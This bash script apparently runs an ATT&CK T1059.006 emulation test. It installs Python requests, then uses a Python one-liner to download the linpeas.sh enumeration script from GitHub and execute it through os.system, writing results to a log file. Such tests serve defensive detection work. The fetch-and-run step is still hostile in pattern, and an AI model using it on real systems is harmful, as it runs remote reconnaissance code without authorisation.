#!/bin/bash

# Function to check if Python 3 is available
check_python() {
  which_python=$(which python3 || which python || which python3.9)
  if [ -z "$which_python" ]; then
    echo "Python 3 is not installed. Please install Python 3 to proceed."
    exit 1
  else
    echo "Python found: $which_python"
  fi
}

# Function to install pip if not available
install_pip() {
  if ! $which_python -m pip --version >/dev/null 2>&1; then
    echo "Pip is not installed. Installing pip..."
    curl -sSL https://bootstrap.pypa.io/get-pip.py -o get-pip.py
    $which_python get-pip.py
    rm get-pip.py
    if [ $? -ne 0 ]; then
        echo "Failed to install pip. Exiting."
        exit 1
    fi
  fi
}

# Function to check if requests library is available
check_requests() {
  $which_python -c 'import requests' 2>/dev/null
  if [ $? -ne 0 ]; then
    echo "Python requests library is not installed. Installing..."
    $which_python -m pip install requests
    if [ $? -ne 0 ]; then
        echo "Failed to install requests module. Exiting."
        exit 1
    fi
  else
    echo "Python requests library is already installed."
  fi
}

# Run SISA Test #1
atomic_test_1() {
  echo "Running SISA Test #1 - Execute shell script via python's command mode argument"
  script_url="https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"
  payload_file_name="T1059.006-payload"
  executor="sh"
  script_args="-q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"
  
  $which_python -c "import requests; import os; url = '${script_url}'; malicious_command = '${executor} ${payload_file_name} ${script_args}'; session = requests.session(); source = session.get(url).content; fd = open('${payload_file_name}', 'wb+'); fd.write(source); fd.close(); os.system(malicious_command)"
  
  # Cleanup
  rm ${payload_file_name}
}

# Function to set up directories and output file
setup_output() {
  output_dir="Linux_output/Execution"
  output_file="T1059.006_Execution_python.txt"
  
  # Check if Linux_output directory exists
  if [ ! -d "Linux_output" ]; then
    mkdir Linux_output
  fi
  
  # Check if Execution directory exists inside Linux_output
  if [ ! -d "$output_dir" ]; then
    mkdir -p $output_dir
  fi
  
  # Redirect all output to the specified file
  exec > >(tee -a "$output_dir/$output_file") 2>&1
}

# Main function to execute tests
main() {
  setup_output
  check_python
  install_pip
  check_requests

  atomic_test_1

  echo "Test completed."
}

# Run the main function
main
